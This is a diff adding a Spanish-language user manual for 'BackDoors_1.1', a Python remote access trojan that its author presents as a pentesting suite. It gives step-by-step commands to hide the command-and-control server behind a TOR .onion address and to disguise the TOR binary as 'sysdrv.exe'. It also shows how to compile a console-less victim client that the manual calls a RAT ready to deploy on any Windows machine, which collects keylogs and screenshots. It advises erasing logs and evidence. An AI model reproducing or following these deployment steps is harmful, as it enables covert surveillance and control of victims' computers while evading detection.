@@ -1,0 +1,151 @@
+========================================================
+             MANUAL DE USO Y CONFIGURACIÓN
+                      BackDoors_1.1
+========================================================
+
+Autor: WodeN-4ever
+Plataforma: Kali Linux (servidor/C2)
+Última actualización: JUL 2025
+
+--------------------------------------------------------
+ÍNDICE
+--------------------------------------------------------
+1. Introducción
+2. Requisitos previos
+3. Instalación de dependencias
+4. Configuración del servicio oculto TOR (.onion)
+5. Lanzamiento del servidor (C2)
+6. Configuración y despliegue del cliente (víctima)
+7. Exportación de reportes
+8. Recomendaciones de seguridad
+9. Solución de problemas
+
+--------------------------------------------------------
+1. INTRODUCCIÓN
+--------------------------------------------------------
+BackDoors_1.1 es una suite profesional modular para pentesting, 
+control remoto y auditoría en entornos de ciberseguridad.
+Permite el control sigiloso de sistemas objetivo, registro de 
+evidencias y generación de reportes forenses, con máximo anonimato 
+usando TOR (Hidden Service .onion).
+
+--------------------------------------------------------
+2. REQUISITOS PREVIOS
+--------------------------------------------------------
+- Kali Linux actualizado (o cualquier Debian/Ubuntu).
+- Python 3.x
+- pip3
+- TOR (para ocultar el servidor)
+- git
+- Acceso root/sudo (para puertos y servicios)
+
+--------------------------------------------------------
+3. INSTALACIÓN DE DEPENDENCIAS
+--------------------------------------------------------
+a) Clona el repositorio:
+    git clone https://github.com/WodeN-4ever/BackDoors_1.1.git
+    cd BackDoors_1.1
+
+b) Ejecuta el instalador automático:
+    sudo bash setup.sh
+
+Esto instalará todas las dependencias de Python, PyInstaller y Tkinter.
+
+--------------------------------------------------------
+4. CONFIGURACIÓN DEL SERVICIO OCULTO TOR (.onion)
+--------------------------------------------------------
+
+a) Instala TOR:
+    sudo apt update
+    sudo apt install tor
+
+b) Edita el archivo de configuración de TOR:
+    sudo nano /etc/tor/torrc
+
+Agrega al final:
+    HiddenServiceDir /var/lib/tor/backdoors/
+    HiddenServicePort 4444 127.0.0.1:4444
+
+Guarda y cierra el archivo.
+
+c) Reinicia el servicio TOR:
+    sudo systemctl restart tor
+
+d) Obtén tu dirección .onion:
+    sudo cat /var/lib/tor/backdoors/hostname
+
+(Ejemplo: abcd1234efgh5678.onion)
+
+--------------------------------------------------------
+5. LANZAMIENTO DEL SERVIDOR (C2)
+--------------------------------------------------------
+
+a) Verifica que tu server escuche en 127.0.0.1:4444 (NO en 0.0.0.0)
+
+b) Lanza el panel servidor (CLI o GUI):
+    python3 server/main.py
+    # o para GUI:
+    python3 server/gui.py
+
+c) El server estará listo para recibir conexiones entrantes
+   (recuerda: SOLO a través de TOR .onion).
+
+--------------------------------------------------------
+6. CONFIGURACIÓN Y DESPLIEGUE DEL CLIENTE (VÍCTIMA)
+--------------------------------------------------------
+
+a) En el archivo core/config.py, pon la dirección .onion de tu server:
+    C2_HOST = "abcd1234efgh5678.onion"
+    C2_PORT = 4444
+
+b) Asegúrate de que sysdrv.exe (binario de TOR renombrado) está 
+   en la carpeta cliente/.
+
+c) Compila el cliente en un ejecutable:
+    pyinstaller --onefile --noconsole --add-data "core:core" --add-data "modules:modules" cliente/main.py
+
+d) El ejecutable generado en dist/ es el RAT listo para desplegar.
+   Puedes ejecutarlo en cualquier máquina Windows; la conexión irá 
+   por TOR y tu C2 permanecerá oculto.
+
+--------------------------------------------------------
+7. EXPORTACIÓN DE REPORTES
+--------------------------------------------------------
+
+a) Desde el panel GUI del server, usa el botón "Exportar Reporte PDF/TXT"
+   para generar reportes profesionales de la sesión (logs, evidencias,
+   capturas, keylogs, etc).
+
+b) Los archivos PDF y TXT se guardan en:
+    ~/BackDoors_1.1_Reports/
+
+--------------------------------------------------------
+8. RECOMENDACIONES DE SEGURIDAD
+--------------------------------------------------------
+
+- No compartas tu dirección .onion fuera de entornos controlados.
+- Haz copia de seguridad de /var/lib/tor/backdoors/ para no perder tu .onion.
+- Usa entornos virtuales (VMs) para pruebas.
+- Usa firewalls locales para aceptar conexiones SOLO desde TOR.
+- Elimina logs y evidencia tras auditorías si lo requiere la política.
+
+--------------------------------------------------------
+9. SOLUCIÓN DE PROBLEMAS
+--------------------------------------------------------
+
+- Si el cliente no conecta:
+    - Verifica que TOR está activo y la dirección .onion es correcta.
+    - Verifica que el server escucha en 127.0.0.1:4444.
+    - Verifica que no hay errores en core/config.py.
+
+- Si no se generan reportes:
+    - Revisa permisos de escritura en ~/BackDoors_1.1_Reports/
+    - Revisa dependencias fpdf2 y Pillow instaladas.
+
+- Para pruebas o desarrollo, puedes activar conexión directa (sin TOR)
+  cambiando USE_TOR_SOCKS = False en core/config.py.
+
+========================================================
+Fin del manual.
+Para cualquier duda, contactar a WodeN-4ever vía GitHub.
+========================================================
